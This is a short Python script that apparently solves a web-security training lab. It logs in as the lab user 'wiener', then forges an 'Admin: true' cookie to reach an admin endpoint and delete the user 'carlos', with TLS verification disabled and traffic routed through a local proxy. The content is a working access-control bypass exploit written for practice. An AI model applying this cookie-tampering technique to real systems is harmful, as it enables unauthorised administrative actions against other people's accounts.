import urllib3
import sys
import requests
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf(url:str, session:requests.Session):
    try:
        r = session.get(url, verify=False, proxies=proxies, timeout=5)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find("input", {'name': 'csrf'})['value']
        return csrf
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return None
    
def delete_carlos(url:str, session:requests.Session):
    login_url = url + '/login'
    csrf = get_csrf(login_url, session)
    data = {'csrf': csrf, 'username': 'wiener', 'password': 'peter'}
    try:
        r = session.post(login_url, data=data, verify=False, proxies=proxies, timeout=5)
        response = r.text
        if 'Log out' in response:
            print("Logged in successfully")
            session_cookies = r.cookies.get_dict().get('session')
            delete_carlos_url = url + '/admin/delete?username=carlos'
            cookies = {'session': session_cookies, 'Admin': 'true'}
            r = requests.get(delete_carlos_url, verify=False, proxies=proxies, cookies=cookies)
            if r.status_code == 200:
                print("carlos deleted successfully")
                return True
            else:
                print("Could not delete carlos")
                return False
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Script Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} example.com")
        sys.exit(-1)
    url = sys.argv[1]
    if url.endswith('/'):
        url = url.removesuffix('/')
    session = requests.Session()
    if delete_carlos(url, session):
        print("Lab Solved!")
        sys.exit(0)
    else:
        sys.exit(-1)

if __name__ == '__main__':
    main()